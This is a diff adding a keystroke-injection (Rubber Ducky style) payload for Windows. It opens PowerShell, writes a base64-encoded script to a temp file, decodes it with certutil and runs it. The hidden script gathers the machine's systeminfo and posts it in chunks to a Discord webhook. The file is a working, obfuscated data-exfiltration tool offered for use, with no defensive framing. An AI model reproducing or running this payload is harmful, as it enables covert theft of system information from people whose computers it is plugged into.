@@ -1,0 +1,17 @@
+REM Title: Computer info to Discord Webhook
+REM Description: Retrieves the computer information and sends it as JSON content in a POST request to a Discord webhook.
+REM AUTHOR: K1kuK0nK4
+REM Target: Windows
+
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 2000
+REM Replace "webhookgoeshere" by webhook URL.
+STRING $webhook = "webhookgoeshere";
+REM Replace the base64 string by the powershell encoded script.
+STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\k.ps1"; echo JG91dHB1dCA9IHN5c3RlbWluZm8KJGI2NG91dHB1dCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkb3V0cHV0KSkKJG1heFNlZ21lbnRMZW5ndGggPSAxODAwCiRzZWdtZW50cyA9IFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ11dQCgpCmZvciAoJGkgPSAwOyAkaSAtbHQgJGI2NG91dHB1dC5MZW5ndGg7ICRpICs9ICRtYXhTZWdtZW50TGVuZ3RoKSB7CiAgICAkc2VnbWVudCA9ICRiNjRvdXRwdXQuU3Vic3RyaW5nKCRpLCBbTWF0aF06Ok1pbigkbWF4U2VnbWVudExlbmd0aCwgJGI2NG91dHB1dC5MZW5ndGggLSAkaSkpCiAgICAkc2VnbWVudHMuQWRkKCRzZWdtZW50KQp9CmZvcmVhY2ggKCRzZWdtZW50IGluICRzZWdtZW50cykgewogICAgJGJvZHkgPSBAewogICAgICAgIGNvbnRlbnQgPSAkc2VnbWVudAogICAgfSB8IENvbnZlcnRUby1Kc29uCkludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKfQ== > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\k.ps1"
+DELAY 1000
+ENTER
